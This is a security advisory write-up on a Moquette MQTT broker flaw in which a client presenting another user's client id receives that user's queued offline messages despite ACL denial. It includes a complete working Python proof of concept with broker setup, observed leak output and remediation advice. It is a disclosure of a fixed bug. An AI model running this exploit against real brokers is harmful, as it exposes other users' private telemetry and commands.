---
title: "Moquette: Session Takeover by Client ID Delivers the Victim's Offline Backlog"
date: 2026-11-15
target: "moquette-io/moquette"
severity: High
identifier: "GHSA-4vvw-wfr4-qmj3"
advisory_url: "https://github.com/moquette-io/moquette/security/advisories/GHSA-4vvw-wfr4-qmj3"
summary: "Moquette keys persistent MQTT sessions on the client id alone and never re-authorizes the queued offline backlog when a session resumes. A client that connects with a victim's client id while the victim is offline receives the messages queued for topics it is not allowed to read. Fixed in 0.18.2 and 0.19.0."
---

## Summary

Moquette is a Java MQTT broker, shipped as the Maven artifact `io.moquette:moquette-broker`. MQTT has a feature called persistent sessions: a client can disconnect, and the broker holds its subscriptions and queues any matching messages so the client gets them when it comes back. Moquette identifies that stored session by the client id and nothing else. There is no owner attached to it.

When a client resumes a session, Moquette does re-check the subscriptions it inherits against the connecting user's ACL. It does not re-check the messages already sitting in the session queue. So a client that connects with someone else's client id, while that someone is offline, is handed their queued backlog, including messages published to topics the connecting user is not allowed to read. The connecting client's own `SUBSCRIBE` to that topic is refused with SUBACK `0x80`, and the backlog arrives anyway.

I tested this on 0.18.1, the latest release at the time, which already carried the ACL fix for a sibling Will-message bug. It was fixed in 0.18.2 and 0.19.0 and published as [GHSA-4vvw-wfr4-qmj3](https://github.com/moquette-io/moquette/security/advisories/GHSA-4vvw-wfr4-qmj3) (CVSS 7.5, CWE-863 Incorrect Authorization and CWE-287 Improper Authentication).

## Background

An MQTT broker routes messages by topic. A publisher sends to `secret/x`, and every subscriber allowed to read `secret/x` receives it. A broker can enforce an access control list so that a given user may read some topic filters and not others. In Moquette that check is the `authorizator`: `canRead(topic, user, clientId)` for subscriptions and deliveries, `canWrite(...)` for publishes.

Persistent sessions make the broker stateful. A client that connects with `clean_session=false` (or an MQTT 5 session expiry) asks the broker to remember it. If it subscribes to `secret/x` at QoS 1 and then drops off, messages published to `secret/x` while it is gone are queued in its session. On reconnect the queue is drained to the client. This is normal and useful for a fleet of devices that come and go.

The security question is simple: when a session is resumed, does the broker confirm that the client resuming it is the same principal that owned it, and does it re-authorize the data it is about to hand over? Moquette answers no to both.

## The vulnerability

Line numbers below are from release 0.18.1. The relevant code was unchanged on `main` at the time (checked at `67451eba`).

A session carries a client id and no identity. `SessionData` in `ISessionsRepository.java:22` has `private final String clientId` at line 23 and no `username` field anywhere in the file. When a CONNECT arrives, `SessionRegistry.createOrReopenSession(msg, clientId, username)` at line 273 routes an existing session to `reopenExistingSession(msg, clientId, oldSession, username)` at line 292. That method never compares the connecting `username` with whoever created the session. The client id is the whole key.

The username is used in exactly one place on resume: to re-check inherited subscriptions. `reopenExistingSession` calls `reactivateSubscriptions(oldSession, username)` at line 330. That method, at line 342, walks the stored subscriptions and at line 345 calls `authorizator.canRead(existingSub.getTopicFilter(), username, ...)`. Subscriptions the new identity may not read are dropped. This is why live traffic published after the takeover does not reach the attacker: the inherited subscription is removed. The queued messages are neither re-checked nor purged.

The queue drain performs no authorization at all. `Session.flushAllQueuedMessages()` at line 378 calls `drainQueueToConnection()` at line 379. The body of `drainQueueToConnection()` at line 463 pushes each queued message to the bound connection with no `authorizator` call on the path. Compare that with the three normal publish paths in `PostOffice.java` at lines 652, 699 and 1007, which all call `authorizator.canWrite(...)` before routing. The drain is the odd one out. It fires right after CONNECT: `MQTTConnection.java:1067` queues a drain command from `readCompleted()`, and line 1073 calls `bindedSession.flushAllQueuedMessages()`.

This is the same shape of bug the project had already fixed once. In 0.18.1, `PostOffice.publishWill()` was changed to call `authorizator.canWrite()` (the fix commit `f5a323fe` touches `PostOffice.java:327`), closing a Will-message delivery that bypassed the ACL. That fix covered one method. The queue-drain delivery path was left as it was. A delivery path that skips the authorizator is exactly the pattern, and there were two of them.

## Proof of concept

Tested against the official release bundle `distribution-0.18.1-bundle.tar.gz`, the build that already contains the Will ACL fix.

Broker config, `config/moquette.conf`:

```
port 1884
host 127.0.0.1
allow_anonymous false
password_file config/passwords.conf
acl_file config/acl.conf
persistent_client_expiration 1h
```

`config/acl.conf`, with concrete topic names on purpose (see the parser note at the end):

```
user alice
topic readwrite secret/x

user bob
topic readwrite public/y

user pub
topic write secret/x
```

`config/passwords.conf`, `username:sha256hex(password)`:

```
alice:<sha256("alicepw")>
bob:<sha256("bobpw")>
pub:<sha256("pubpw")>
```

The script below writes those three files, starts the broker, runs the takeover with a control, and prints the broker-log lines that prove the backlog delivery. Save it as `moquette_session_takeover_poc.py`, extract the bundle to `./broker-0.18.1`, then run `pip install paho-mqtt && python3 moquette_session_takeover_poc.py ./broker-0.18.1`.

```python
#!/usr/bin/env python3
"""
Self-contained PoC for moquette-broker <= 0.18.1 (latest release at the time of writing):
a persistent session is bound to a client id only, so any client that presents a victim's
client id while the victim is offline receives the messages queued for topics it is not
allowed to read.

Usage:
    pip install paho-mqtt
    curl -LO https://github.com/moquette-io/moquette/releases/download/v0.18.1/distribution-0.18.1-bundle.tar.gz
    tar xzf distribution-0.18.1-bundle.tar.gz          # -> ./broker-0.18.1
    python3 moquette_session_takeover_poc.py ./broker-0.18.1

Prints VULNERABLE when the hijacker (ACL: public/y only) receives the victim's backlog.
"""
import hashlib
import os
import socket
import subprocess
import sys
import tempfile
import time

import paho.mqtt.client as mqtt

BUNDLE = sys.argv[1] if len(sys.argv) > 1 else "./broker-0.18.1"
HOST, PORT = "127.0.0.1", 1884
GOT, SUBACKS = [], {}

CONF = """port {port}
host 127.0.0.1
allow_anonymous false
password_file config/passwords.conf
acl_file config/acl.conf
persistent_client_expiration 1h
""".format(port=PORT)

# NOTE: concrete topic names on purpose, because moquette's ACL parser truncates any rule whose
# topic ends in '#' (it treats the wildcard as the start of an inline comment).
ACL = """user alice
topic readwrite secret/x

user bob
topic readwrite public/y

user pub
topic write secret/x
"""


def sha(pw):
    return hashlib.sha256(pw.encode()).hexdigest()


def client(client_id, user=None, pw=None, label="", clean=False):
    c = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id=client_id, clean_session=clean)
    if user:
        c.username_pw_set(user, pw)

    def on_message(cl, ud, m):
        GOT.append((label, m.topic, m.payload.decode(errors="replace")))
        print(f"  [{label}] >>> RECEIVED topic={m.topic} payload={m.payload.decode(errors='replace')!r}", flush=True)

    def on_subscribe(cl, ud, mid, rcs, props=None):
        SUBACKS[label] = [getattr(r, "value", r) for r in rcs]
        print(f"  [{label}] SUBACK reason_codes={SUBACKS[label]}", flush=True)

    c.on_message, c.on_subscribe = on_message, on_subscribe
    c.connect(HOST, PORT, 30)
    c.loop_start()
    time.sleep(1.0)
    if not c.is_connected():
        print(f"  [{label}] connection failed"); sys.exit(2)
    return c


def wait_port(timeout=60):
    for _ in range(timeout * 2):
        with socket.socket() as s:
            if s.connect_ex((HOST, PORT)) == 0:
                return True
        time.sleep(0.5)
    return False


def main():
    work = tempfile.mkdtemp(prefix="moquette-poc-")
    bundle = os.path.abspath(BUNDLE)          # the broker runs with cwd=work, so the classpath must be absolute
    cfg = os.path.join(work, "config")
    os.makedirs(cfg)
    open(os.path.join(cfg, "moquette.conf"), "w").write(CONF)
    open(os.path.join(cfg, "acl.conf"), "w").write(ACL)
    open(os.path.join(cfg, "passwords.conf"), "w").write(
        f"alice:{sha('alicepw')}\nbob:{sha('bobpw')}\npub:{sha('pubpw')}\n")
    open(os.path.join(work, "log4j.properties"), "w").write(
        "log4j.rootLogger=DEBUG, A1\n"
        "log4j.appender.A1=org.apache.log4j.ConsoleAppender\n"
        "log4j.appender.A1.layout=org.apache.log4j.PatternLayout\n"
        "log4j.appender.A1.layout.ConversionPattern=%d{HH:mm:ss} %-5p %c{1} - %m%n\n")
    log = open(os.path.join(work, "broker.log"), "w")
    proc = subprocess.Popen(["java", "-Dlog4j.configuration=file:log4j.properties",
                             "-cp", os.path.join(bundle, "lib", "*"), "io.moquette.broker.Server"],
                            cwd=work, stdout=log, stderr=subprocess.STDOUT)
    if not wait_port():
        print("broker did not start, is the bundle path right?"); proc.terminate(); return 2
    time.sleep(1)

    print("1) victim alice (ACL: secret/x) subscribes, then disconnects (persistent session)")
    alice = client("alice-device", "alice", "alicepw", "alice", clean=False)
    alice.subscribe("secret/x", qos=1)
    time.sleep(1.5)
    alice.disconnect(); alice.loop_stop(); time.sleep(1.0)

    print("2) publisher queues 3 QoS1 messages on secret/x while alice is offline")
    pub = client("pub-1", "pub", "pubpw", "pub", clean=True)
    for i in range(1, 4):
        pub.publish("secret/x", f"QUEUED-SECRET-{i}", qos=1).wait_for_publish(timeout=5)
    time.sleep(2.0)
    pub.disconnect(); pub.loop_stop()

    print("3) ATTACK: bob (ACL: public/y only) connects with client id 'alice-device'")
    atk = client("alice-device", "bob", "bobpw", "hijacker", clean=False)
    time.sleep(4.0)

    print("4) control: bob's own client id may not subscribe to secret/x")
    ctl = client("bob-device", "bob", "bobpw", "control", clean=True)
    ctl.subscribe("secret/x", qos=1)
    time.sleep(1.5)

    leaked = [g for g in GOT if g[0] == "hijacker" and g[1] == "secret/x"]
    codes = SUBACKS.get("control", [])
    print("\n  hijacker's own SUBSCRIBE secret/x :", codes, "(128 = denied by ACL)")
    print("  backlog leaked to the hijacker    :", f"{len(leaked)}/3")

    for c in (atk, ctl):
        try:
            c.disconnect(); c.loop_stop()
        except Exception:
            pass
    time.sleep(1)
    proc.terminate()
    try:
        proc.wait(timeout=10)
    except Exception:
        proc.kill()
    log.close()

    logtext = open(os.path.join(work, "broker.log")).read()
    proof = [l for l in logtext.split("\n")
             if "sendOfflineMessages" in l or ("topic=secret/x" in l and "to alice-device" in l)]
    if proof:
        print("\n  broker log (proof the backlog was delivered to the hijacked session):")
        for l in proof[:5]:
            print("   ", l.strip())

    if len(leaked) >= 1 and codes and codes[0] == 128:
        print("\n  RESULT: VULNERABLE, the hijacker has no ACL rights on secret/x yet received the backlog.")
        return 0
    print("\n  RESULT: not reproduced")
    return 1


if __name__ == "__main__":
    sys.exit(main())
```

Observed output on release 0.18.1, reproduced 3 times out of 3:

```
1) victim alice (ACL: secret/x) subscribes, then disconnects (persistent session)
  [alice] SUBACK reason_codes=[1]
2) publisher queues 3 QoS1 messages on secret/x while alice is offline
3) ATTACK: bob (ACL: public/y only) connects with client id 'alice-device'
  [hijacker] >>> RECEIVED topic=secret/x payload='QUEUED-SECRET-1'
  [hijacker] >>> RECEIVED topic=secret/x payload='QUEUED-SECRET-2'
  [hijacker] >>> RECEIVED topic=secret/x payload='QUEUED-SECRET-3'
4) control: bob's own client id may not subscribe to secret/x
  [control] SUBACK reason_codes=[128]

  hijacker's own SUBSCRIBE secret/x : [128] (128 = denied by ACL)
  backlog leaked to the hijacker    : 3/3

  broker log (proof the backlog was delivered to the hijacked session):
    08:37:03 DEBUG SessionEventLoopGroup - Routing cmd [sendOfflineMessages] for session [alice-device] to event processor 3
    08:37:03 DEBUG MQTTConnection - Sending PUBLISH(AT_LEAST_ONCE) message. MessageId=1, topic=secret/x to alice-device
    08:37:03 DEBUG MQTTConnection - Sending PUBLISH(AT_LEAST_ONCE) message. MessageId=2, topic=secret/x to alice-device
    08:37:03 DEBUG MQTTConnection - Sending PUBLISH(AT_LEAST_ONCE) message. MessageId=3, topic=secret/x to alice-device

  RESULT: VULNERABLE, the hijacker has no ACL rights on secret/x yet received the backlog.
```

The control is what makes it unambiguous. The same attacker, `bob` with ACL `public/y` only, is refused when he subscribes to `secret/x` under his own client id (SUBACK 128). Traffic published live after the takeover is not delivered to him, since the inherited subscription is re-checked and removed. Yet the messages queued for alice before the takeover arrive. The broker log says it plainly: `sendOfflineMessages for session [alice-device]`, then three `Sending PUBLISH ... topic=secret/x to alice-device`.

A second run of the same PoC with `allow_anonymous true` and a hijacker that sends no credentials at all, only alice's client id, leaks the backlog 3 out of 3 as well. That is why the vector carries PR:N: on a default anonymous broker a bare TCP client is enough.

## Impact

Everything queued for the victim while it was offline becomes readable by whoever presents its client id: device telemetry, commands, payloads that carry credentials. The attacker never subscribes to the protected topic, because the ACL would refuse that, and receives the data as the session owner instead.

Client ids are not secrets. A fleet picks them, and they are frequently predictable. With `pattern` ACLs such as `pattern read sensor/%c/#`, the client id is literally a topic segment, so anyone allowed to read those topics learns it. One connection takes over one victim, and sessions survive for `persistent_client_expiration`, so a fleet's client ids can be walked to harvest each backlog in turn.

There is no integrity or availability impact. This path cannot publish, only receive. Hence the score of 7.5 with confidentiality only.

## Remediation

The fix belongs in two places, and either one closes the leak. Bind the session to the authenticated identity: store the username (or a stable identity handle) in `SessionData`, and in `reopenExistingSession()` refuse a resume by a different identity, or purge the session state rather than inherit it. And authorize the backlog like everything else: before delivering each queued message in `drainQueueToConnection()`, consult `authorizator.canRead(topic, username, clientId)` and drop what the current identity may not read, the same treatment already applied to inherited subscriptions. The cheapest conservative option is to purge the queue on takeover when the identity differs.

## A parser aside

While building the PoC I had to use concrete topic names in the ACL, not wildcards, and the reason turned out to be a second class of bug in `ACLFileParser`. Its inline-comment stripper (`ACLFileParser.java:99`, applied at lines 114 to 115) silently rewrites operator rules, so the policy that loads is not the policy written in the file. All three cases below fail closed, which is why they are noted here rather than scored, but they are the kind of thing that makes an ACL quietly mean something other than what the operator typed.

First, `topic readwrite secret/#` is truncated to `topic readwrite secret/`, because the `#` wildcard is read as the start of a comment. A multi-level wildcard rule then matches nothing: `canRead("secret/x")` is false and `canRead("secret/")` is true. Second, `topic readwrite secret/x # comment` keeps the whitespace before `#` inside the topic, so the rule is stored for the literal topic `secret/x ` and matches nothing. Third, `pattern read sensor/%c/#   # devices` throws a `NullPointerException` at parse time, because `%` is not matched by the stripper's character class and the raw `# devices` reaches the `Topic` constructor. Drop the comment and the same pattern parses and works.

## Timeline

- Reported privately to the maintainer.
- Fixed in Moquette 0.18.2 and 0.19.0.
- 2026-11-15: advisory [GHSA-4vvw-wfr4-qmj3](https://github.com/moquette-io/moquette/security/advisories/GHSA-4vvw-wfr4-qmj3) published.

## Disclosure

This writeup is based on the public advisory [GHSA-4vvw-wfr4-qmj3](https://github.com/moquette-io/moquette/security/advisories/GHSA-4vvw-wfr4-qmj3) for `io.moquette:moquette-broker`, fixed in 0.18.2 and 0.19.0.
